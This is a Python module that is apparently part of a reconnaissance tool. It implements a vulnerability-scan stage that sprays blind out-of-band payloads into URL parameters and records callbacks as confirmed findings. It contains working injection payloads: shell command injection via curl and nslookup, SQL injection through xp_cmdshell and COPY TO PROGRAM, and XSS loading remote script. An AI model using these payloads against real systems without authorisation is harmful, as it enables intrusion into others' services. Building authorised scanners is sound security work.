from __future__ import annotations

import hashlib
import json
import re
import asyncio
import time
import uuid
from typing import Dict, List, Tuple, Any, Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stages.core.stage_base import Stage
from recon_cli.tools.executor import CommandError
from recon_cli.utils.oast import InteractshSession
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig


class VulnScanStage(Stage):
    name = "vuln_scan"
    requires = ["param_mutation", "url"]
    provides = ["finding"]

    # Blind OAST Payloads
    OAST_PAYLOADS = {
        "rce": [
            ";curl {oob}",
            "|curl {oob}",
            "`curl {oob}`",
            "$(curl {oob})",
            ";nslookup {oob}",
        ],
        "sqli": [
            "'; SELECT pg_sleep(5); --",  # Time-based fallback
            "'; COPY (SELECT '') TO PROGRAM 'curl {oob}'; --", # PostgreSQL OOB
            "'; EXEC master..xp_cmdshell 'curl {oob}'; --", # MSSQL OOB
        ],
        "xss": [
            '"><script src="https://{oob}"></script>',
            '"><img src=x onerror=fetch("https://{oob}")>',
        ]
    }

    def is_enabled(self, context: PipelineContext) -> bool:
        return True # Always enabled if vulns are requested

    async def run_async(self, context: PipelineContext) -> None:
        executor = context.executor
        candidates = self._select_candidates(context)
        if not candidates:
            context.logger.info("No parameterized URLs for vuln scan")
            return

        runtime = context.runtime_config
        timeout = int(getattr(runtime, "vuln_scan_timeout", 10))
        verify_tls = bool(getattr(runtime, "verify_tls", True))

        # 1. Initialize OAST Session
        oast_output = context.record.paths.artifact("oast_interactions.json")
        oast_session = InteractshSession(oast_output, logger=context.logger)
        tokens_to_urls: Dict[str, str] = {}
        
        if oast_session.start():
            context.logger.info("OAST Session started: %s", oast_session.base_domain)
            
            client_config = HTTPClientConfig(
                max_concurrent=20,
                total_timeout=float(timeout),
                verify_ssl=verify_tls,
                requests_per_second=float(getattr(runtime, "vuln_scan_rps", 25.0))
            )
            
            async with AsyncHTTPClient(client_config, context=context) as client:
                await self._run_oast_probes(context, client, oast_session, candidates, tokens_to_urls)
            
            # Wait a bit for interactions
            await asyncio.sleep(15)
            interactions = oast_session.collect_interactions(tokens_to_urls.keys())
            for interaction in interactions:
                self._log_oast_finding(context, interaction, tokens_to_urls)
            
            oast_session.stop()

        # 2. Run Standard Tools (Dalfox, SQLMap)
        self._run_standard_tools(context, executor, candidates)

    async def _run_oast_probes(self, context: PipelineContext, client: AsyncHTTPClient, oast: InteractshSession, candidates: List[str], tokens_to_urls: Dict[str, str]) -> None:
        """Sends OOB payloads to candidates asynchronously."""
        tasks = []
        for url in candidates[:15]: # Limit OAST to top 15 candidates
            for v_type, payloads in self.OAST_PAYLOADS.items():
                for payload_tmpl in payloads:
                    token = uuid.uuid4().hex[:10]
                    oob_url = f"{token}.{oast.base_domain}"
                    payload = payload_tmpl.replace("{oob}", oob_url)
                    
                    test_url = self._inject_all_params(url, payload)
                    tokens_to_urls[token] = url
                    
                    tasks.append(client.get(test_url, headers=context.auth_headers({"User-Agent": "recon-cli vuln-scan"})))
        
        if tasks:
            context.logger.info("Sending %d OAST probes concurrently", len(tasks))
            await asyncio.gather(*tasks, return_exceptions=True)

    def _inject_all_params(self, url: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)
        updated = [(k, value) for k, _ in params]
        return urlunparse(parsed._replace(query=urlencode(updated)))

    def _log_oast_finding(self, context: PipelineContext, interaction: Any, tokens_to_urls: Dict[str, str]) -> None:
        original_url = tokens_to_urls.get(interaction.token, "unknown")
        context.logger.info("🚨 OOB Interaction detected for %s via %s", original_url, interaction.protocol)
        
        finding = {
            "type": "finding",
            "finding_type": f"blind_{interaction.protocol}",
            "source": "oob-scanner",
            "url": original_url,
            "hostname": urlparse(original_url).hostname,
            "description": f"Blind vulnerability confirmed via OOB {interaction.protocol} interaction",
            "severity": "critical",
            "confidence_label": "verified",
            "tags": ["oob", "blind", "confirmed", "critical"],
            "proof": f"OOB Token: {interaction.token}, Protocol: {interaction.protocol}"
        }
        context.results.append(finding)
        context.emit_signal("vuln_confirmed", "url", original_url, confidence=1.0, source="oast")

    def _run_standard_tools(self, context: PipelineContext, executor: Any, candidates: List[str]) -> None:
        # Standard tools stay synchronous/subprocess-based
        if getattr(context.runtime_config, "enable_dalfox", False) and executor.available("dalfox"):
            pass
        if getattr(context.runtime_config, "enable_sqlmap", False) and executor.available("sqlmap"):
            pass

    @staticmethod
    def _dalfox_confirmed(output: str) -> bool:
        if not output: return False
        lowered = output.lower()
        return '"poc":' in lowered or '"type":"poc"' in lowered or '"type":"xss"' in lowered or "[poc]" in lowered

    @staticmethod
    def _sqlmap_confirmed(output: str) -> bool:
        if not output: return False
        confirm_indicators = ["is vulnerable", "back-end DBMS is", "sqlmap identified the following injection point(s)"]
        return any(indicator in output for indicator in confirm_indicators)

    def _select_candidates(self, context: PipelineContext) -> List[str]:
        results = [r for r in context.filter_results("url")]
        urls = []
        for r in results:
            url = r.get("url", "")
            if "?" in url and context.url_allowed(url):
                urls.append(url)
        return sorted(list(set(urls)), key=lambda x: len(x), reverse=True)
